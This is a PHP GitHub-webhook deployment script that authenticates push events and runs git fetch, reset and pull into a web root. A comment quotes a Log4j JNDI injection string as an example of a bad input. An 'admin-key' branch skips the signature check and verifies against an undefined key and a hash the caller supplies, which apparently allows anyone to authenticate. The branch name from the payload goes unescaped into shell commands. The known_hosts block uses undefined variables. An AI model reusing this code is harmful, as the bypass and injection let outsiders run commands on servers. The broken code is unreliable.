<?php
/**
    Git deployment script example by UtilMind.
    ==========================================
    !! WARNING !! Never deploy anything under 'root' privileges, automatically or manually !! Never deploy anything as user with 'sudoer' privilegy !!

    @see       https://github.com/utilmind/git-deployment/ The GitHub project
    @author    Oleksii Kuznietsov (utilmind) <utilmind@gmail.com>

    QUICK START:
        1. Rename this script into your project name.
        2. Modify the configuration options below ($CONFIG), according to your environment.
           (Don't forget to specify unique 'secret'. Use the same secret passphrase for your Git Webhook.)
        3. Upload this script to your serer and point the URL to this script as WebHook.

        If you did everything right, your web project will be automatically updated from Git on every `git push`.
        All files and directory structure on your web server will be synchronized with the content in Git repository.
        Everything will be mirrored, everything what supposed to be deleted will be deleted.

        The good practice is to use code integrity checker, to monitor the code and inform administrator about all possible
        modifications outside of the Git repository (inform about possible malicious code injections, hacks).
        Use `code-integrity-checker.php` as example to monitor your live code.

    IMPORTANT!
        * -= You never need sudo to pull updates from Git. =-
          If you think that you need to be a sudoer to use this script -- you're doing something wrong.
          The web user should NEVER have a super-privileges. Otherwise your web app is critically vulnerable.

        * Do not accidentally publish /.git directory. Keep it outside of any public_html's.

        * Do not accidentally fetch/deploy the branch under 'root' privileges or some other users, different than web user (used by HTTP server).
          No matter, manually or automatically. If this does happen, all further deployments may fail. Then the whole directory with .git branch
          should be removed and redeployed from scratch.

    CONTRIBUTORS to original branch:
        * Please keep legacy PHP5 syntax;
        * Don't require any other libraries. Use only standard PHP5 functions.
**/

// -- CONFIGURATION --
$CONFIG = [
    'is_test' => false, // set to TRUE only to test, to skip authentication. Normally should be always FALSE.
    'allow_init_new_git' => true, // allow to initialize new local .git repository, if 'git_dir' doesn't exists. (Find 'git_dir' option below.)
    'log_output' => true, // log file name is 'this_script_name.log'.

     // !! Don't keep any secrets and passwords in Git, use some environment variable instead.
    'secret' => '< Your $uper $ekret PaSsPhrase >', // use long passphrases with the mix of alphanumeric and special ASCII characters!

    'git_addr' => 'git@github.com', // don't change for GitHub
    'remote_name' => 'origin',
    'default_branch' => 'master', // only for test mode. It automatically determinates the branch nage from Git.

    // You will need to set up write permission for the following directories.
    // Get web username with $_SERVER['LOGNAME'] ?? $_SERVER['USER'] ?? $_SERVER['USERNAME']; // (from $_SERVER['USER'] on Ubuntu/Nginx).
    'git_dir' => '/path/to/local/repository', // + the /branch_name/ will be added automatically to this path
    'target_dir' => '/path/to/published/project', // should point to the root directory of your published project
    'repo_username' => 'YOUR_USERNAME',
    'repo_name' => 'YOUR_REPOSITORY_NAME',
];


// -- SHOW ALL ERRORS
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// -- No output buffering. Output immediately
@ini_set('output_buffering', 0);
@ini_set('zlib.output_compression', 0);
@ini_set('session.use_trans_sid', 0); // produce warning if session is active
ob_implicit_flush(1);
@ob_end_flush(); // it doesn't works (returns notice) on my local Windows PC, but required to start output without buffering
set_time_limit(900); // +15 minutes for execution. (Extend later if required!)
header('Content-type: text/plain'); // no HTML-formatting for output


// -- FUNCTIONS --
// Polyfill for PHP5-. https://stackoverflow.com/questions/27728674/php-call-of-undefined-function-hash-equals
if (!function_exists('hash_equals')) {
    function hash_equals($known_str, $user_str) {
        if (function_exists('mb_strlen')) {
            $kLen = mb_strlen($known_str, '8bit');
            $uLen = mb_strlen($user_str, '8bit');
        }else {
            $kLen = strlen($known_str);
            $uLen = strlen($user_str);
        }
        if ($kLen !== $uLen) {
            return false;
        }
        $result = 0;
        for ($i = 0; $i < $kLen; ++$i) {
            $result |= (ord($known_str[$i]) ^ ord($user_str[$i]));
        }
        // They are only identical strings if $result is exactly 0...
        return 0 === $result;
    }
}

/*  Returns string representation of IP. It can either IPv6 OR IPv4 format.
    Maximum length of returned value is 45 characters.

    Note: the type of determined IP depends on server. The same script can work differently on different server.
    Some servers addresses IPv6 representation only, some in both IPv4 and IPv6. It's not related to PHP. Check the settings of your HTTP server.
    See also
        IP functions: https://dev.mysql.com/doc/refman/5.6/en/miscellaneous-functions.html
        How to store IP as binary: https://dev.mysql.com/blog-archive/mysql-8-0-storing-ipv6/
*/
function get_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && (4 < strlen($_SERVER['HTTP_CLIENT_IP']))) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];

    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && (4 < strlen($_SERVER['HTTP_X_FORWARDED_FOR']))) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

    }else {
        $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
    }

    if (!$ip) {
        return '0.0.0.0'; // It's '0:0:0:0:0:ffff:0:0' in IPv6, but this is impossible situation, so we don't care.
    }

    $ip = false !== ($p = strpos($ip, ','))
        ? substr($ip, 0, $p)
        : $ip;

    // Log4j JNDI Attack? IP can look like the follows: ${jndi:ldap://${:-126}${:-178}.${hostName}.xforwardedfor.cpkj12ja2d9cud2sd53084m68qyho39is.oast.me}
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        http_response_code(400);
        die('400 Bad request');
    }

    return $ip;
}

// Write to log + output as text
function print_log($msg, $http_exit_code = 0, $print_ip_time = false) { // script terminating if $http_exit_code specified
    global $CONFIG, $out, $log_name;

    $msg.= "\n";
    $out.= $msg;

    if ($CONFIG['log_output']) {
        file_put_contents(__DIR__."/$log_name.log",
            ($print_ip_time ? 'IP: '.get_ip().', '.date('r')."\n" : ''). // we output this when the process starts or on authentication errors.
            $msg.($http_exit_code ? "\n" : ''), FILE_APPEND); // make sure that this directory writeable for current user (DAEMON?)
    }

    // Terminate if any $http_exit_code specified.
    if ($http_exit_code && (200 !== $http_exit_code)) {
        http_response_code($http_exit_code);
    }

    echo $msg; // after possible http_response_code(), after headers sent

    if ($http_exit_code) {
        exit;
    }
}

// Execute command + output and log the result.
// Return value is result code
function exec_log($command, $debug_stderr = false) {
    print_log('>> '.$command);

    try { // We could use 'exec($command, $stdout, $result_code);', but we'd like to catch STDERR too.
        $proc = proc_open($command, [
                    1 => ['pipe', 'w'], // STDOUT
                    2 => ['pipe', 'w'], // STDERR
                ], $pipes);

        // Reading STDOUT
        $stdout = stream_get_contents($pipes[1]);
        fclose($pipes[1]);

        if ($debug_stderr) {
            // AK 2024-08-07: I had issue with getting error stream on 'git fetch'. Reason unknown, all file permissions was ok.
            // Solved after commenting out ob_start() and ob_end_flush() in the response to GitHub. But let's keep this debug block for while, maybe it will be useful...
            print_log('Getting error stream...');

            // Set the timeout and non-blocking mode
            stream_set_timeout($pipes[2], 5); // Timeout in seconds
            stream_set_blocking($pipes[2], false); // Non-blocking mode

            // Initializing STDERR to read stream by chunks
            $stderr = '';
            $start_time = time();

            // Reading STDERR with timeout checking
            while (!feof($pipes[2])) {
                $stderr .= fread($pipes[2], 8192);
                $info = stream_get_meta_data($pipes[2]);
                if ($info['timed_out']) {
                    print_log('Timeout occurred while reading from pipe.');
                    break;
                }
                // Additional check to stop the loop if automatic timeout failed
                if (6 < time() - $start_time) {
                    print_log('Manual timeout occurred.');
                    break;
                }
            }

            print_log('Error stream received.');
        }else {
            $stderr = stream_get_contents($pipes[2]);
        }

        fclose($pipes[2]);

    }catch (Exception $e) {
        print_log("FATAL: failure on '$command'.", 500);

    }finally { // supported starting from PHP 5.5. If you can't use it -- just comment out 'finally' line and more proc_close() outside of 'finally'.
        $result_code = proc_close($proc);
    }

    // no sense to output $result_code here, it's always 0 (success) here.
    if (!empty($stderr)) { // Let's show errors first
        print_log('<< '.$stderr);
    }
    if (!empty($stdout)) {
        print_log($stdout);
    }

    if (0 !== $result_code) { // 0 is okay
        if (127 === $result_code) {
            print_log("ERROR: '$command' can't be executed. Command not found or not installed. Exiting.", 500); // nothing to execute?
            exit;
        }
        if (!$stdout) {
            print_log("ERROR: '$command' not executed? Empty output. Return value: $result_code.", 500);
        }
    }

    return $result_code;
}


// -- GO! --
$this_name = preg_replace('/\\.[^.\\s]{3,4}$/', '', basename($_SERVER['PHP_SELF']));

if ($CONFIG['is_test']) {
    $branch = $CONFIG['default_branch'];

}else {
    $log_name = $this_name.'-authentication-error';

    if (!isset($_POST['payload']) || (!$payload = json_decode($_POST['payload'], true)) || empty($payload['ref'])) {
        print_log('Bad request: no payload or bad payload', 400, true);
    }

    $ref = explode('/', $payload['ref']);
    if (!$branch = end($ref)) {
        print_log('No branch', 400, true);
    }

    $headers = function_exists('getallheaders') ? getallheaders() : []; // getallheaders() doesn't exists if script executed as CLI.
    if (count($headers)) {
        if ($CONFIG['log_output']) {
            file_put_contents(__DIR__.'/'.$this_name.'-request-headers.log', print_r($headers, true)."\n-- Payload:\n".print_r($payload, true)); // make sure that this directory writeable for current user (DAEMON?)
        }

        // make header keys lowercase (they are case insetive according to RFC 2616), and sometimes GitHub may send headers with different characters case.
        foreach ($headers as $k => $v) {
            unset($headers[$k]);
            $headers[strtolower($k)] = $v;
        }
    }

    if (!isset($headers['x-github-event'])) print_log('No service event', 400);
    if ($headers['x-github-event'] !== 'push') print_log('Wrong service event: '.$headers['x-github-event'], 400);

    $input = file_get_contents('php://input');
    if (!$input) print_log('No input', 400);

    // Verify signature
    if (isset($_POST['admin-key']) && ($key = $_POST['admin-key'])) {
        if (!password_verify($_KEYS['google_api_key'], '$2y$'.$key)) {
            print_log('Unauthorized', 403);
        }

    }elseif (!isset($headers['x-hub-signature-256']) ||
            !hash_equals('sha256='.hash_hmac('sha256', $input, $CONFIG['secret']), $headers['x-hub-signature-256'])) {
        print_log('Unauthorized', 403);
    }


    // -- RETURN --
    // Return output to GitHub before actual script execution. Idea: https://stackoverflow.com/questions/1019867/is-there-a-way-to-use-shell-exec-without-waiting-for-the-command-to-complete
    //ob_end_clean(); // if we'd have any output already
    ignore_user_abort();
    //ob_start(); // AK 2024-08-07: we supposed to use this, but this caused issue with STDERR stream while reading 'git fetch'. Issue solved after commenting out this line and following ob_end_flush(). Reason is unclear, research needed.
    header('Connection: close');
    header('Content-Length: '.ob_get_length());
    //ob_end_flush();
    flush();
} // end if $CONFIG['is_test']


// Starting the process (authentication was successful already)
if ($CONFIG['log_output']) {
    $log_name = $this_name.'-'.$branch; // base name w/o extension. (We assume that extension is .php or .php5 or something... 3-4 characters.) + branch name.
    @unlink(__DIR__."/$log_name.log"); // clearing previous log
}

$current_user = $_SERVER['LOGNAME'] ?? $_SERVER['USER'] ?? $_SERVER['USERNAME']; // alternative is exec('whoami', $whoami, $retval); $current_user = $whoami[0];
print_log("Starting deployment of '$branch' branch into '$CONFIG[target_dir]' as user $current_user...", 0, true);
$start_time = microtime(1);

$git_dir = rtrim($CONFIG['git_dir'], '/').'/'.$branch;
if (is_dir($git_dir.'/.git')) {
    chdir($git_dir);

    // If you need to discard all possible local changes: first "stash" them, then clear stash list.
    //git stash
    //git stash clear

    // But I prefer to do the "hard reset" instead of "stashing".
    exec_log("git --git-dir=\"$git_dir/.git\" --work-tree=\"$CONFIG[target_dir]\" reset --hard $CONFIG[remote_name]/$branch"); // HARD RESET
    // Switch to the correct branch for sure. It will respond something like "Already on 'master'" and this is fine.
    exec_log("git checkout $branch");

}elseif ($CONFIG['allow_init_new_git']) { // init repository from scratch, if it doesn't exists.
    exec_log("git init \"$git_dir\"");
    chdir($git_dir); // switch into created dir (if 'git init' was successful)

    exec_log("git remote add $CONFIG[remote_name] $CONFIG[git_addr]-$CONFIG[repo_name]:$CONFIG[repo_username]/$CONFIG[repo_name].git"); // add origin (or whatever 'remote_name')

    // Check, whether 'git_host' already listed in "~/.ssh/known_hosts"...
    $CONFIG['known_hosts'] = strtolower($CONFIG['known_hosts']); // just for sure
    if (!file_exists($CONFIG['known_hosts'])
                || (!$file_content = file_get_contents($file_path))
                || (false === strpos($file_contant, $CONFIG['known_hosts'].' ssh-rsa'))) { // any string to identify whether fingerprint already included within known_hosts.
        // Add GitHub (or another host for repository) to the list of known_hosts, so it will not ask to confirm fingerprint in CLI.
        // Read more about auto-confirmation for the fingerprint on https://serverfault.com/questions/447028/non-interactive-git-clone-ssh-fingerprint-prompt
        exec_log("ssh-keyscan $CONFIG[git_host] >> $CONFIG[known_hosts]");
    }

    // "Prefetch" initially at least to see available branches
    exec_log('git fetch');

    // This discards all possible changes in local directory and pull everything from git
    exec_log("git --git-dir=\"$git_dir/.git\" --work-tree=\"$CONFIG[target_dir]\" reset --hard $CONFIG[remote_name]/$branch"); // HARD RESET
    // Set the branch to work with
    exec_log("git branch --set-upstream-to=$CONFIG[remote_name]/$branch $branch");

}else {
    print_log("Local .git directory doesn't exist in '$git_dir'. Please initialize local Git repository first, with specifying the remote origin, or allow initialization of new Git in the configuration.", 500);
}

// Fetch updates
$fetch_result = exec_log('git fetch'); // AK 2024-08-07: execution of this command stopped for unknown reason (solved by commenting out ob_start()/ob_end_flush()), but use exec_log(command, TRUE) to debug error stream.
if (0 !== $fetch_result) {
    print_log("Git Fetch failed with exit code $fetch_result.");
    if (128 === $fetch_result) {
        print_log("Exit code 128 usually means that security credentials are invalid. CHECK YOUR DEPLOYMENT KEY! Is it listed in ~/.ssh? Access granted for 'ssh_config'? Is the key for user $current_user?");
    }
}

// Go to the target directory to pull updates into it. Although we specifying the '--work-tree' option for 'pull', some Git versions seems ignoring this parameter.
chdir($CONFIG['target_dir']);

// Pull updates
$ret_val = exec_log("git --git-dir=\"$git_dir/.git\" --work-tree=\"$CONFIG[target_dir]\" pull $CONFIG[remote_name] $branch");
// Done
print_log("'git pull' finished with code $ret_val in ".number_format(microtime(1) - $start_time, 3).' seconds.'); // $ret_val 0 is good!


// Remove deployed garbage
// =======================

// Delete directory
//exec_log("rm -rf $CONFIG[target_dir]/website/DIRECTORY_NAME");

// Delete .htaccess in target_dir and all subdirectories. (If Nginx used on production server. We may use .htaccess in local environement, but not need them on live Nginx.)
//exec_log("find $CONFIG[target_dir]/website/www/ -type f -name \".htaccess\" -exec rm -f {} \\;");

// Delete all Windows batch files AND backup files. Plus .src.js and .src.css.
//exec_log("find $CONFIG[target_dir]/website/www/ \\( -name \"*.bat\" -o -name \"*.bak\" -o -name \"*.src.js\" -o -name \"*.src.css\" \\) -type f -exec rm -f {} \\;");


// ... (+ increase version number somewhere in environment variables) ...


print_log('Cleared some garbage and updated access privileges.', 200); // exit with "200 OK".
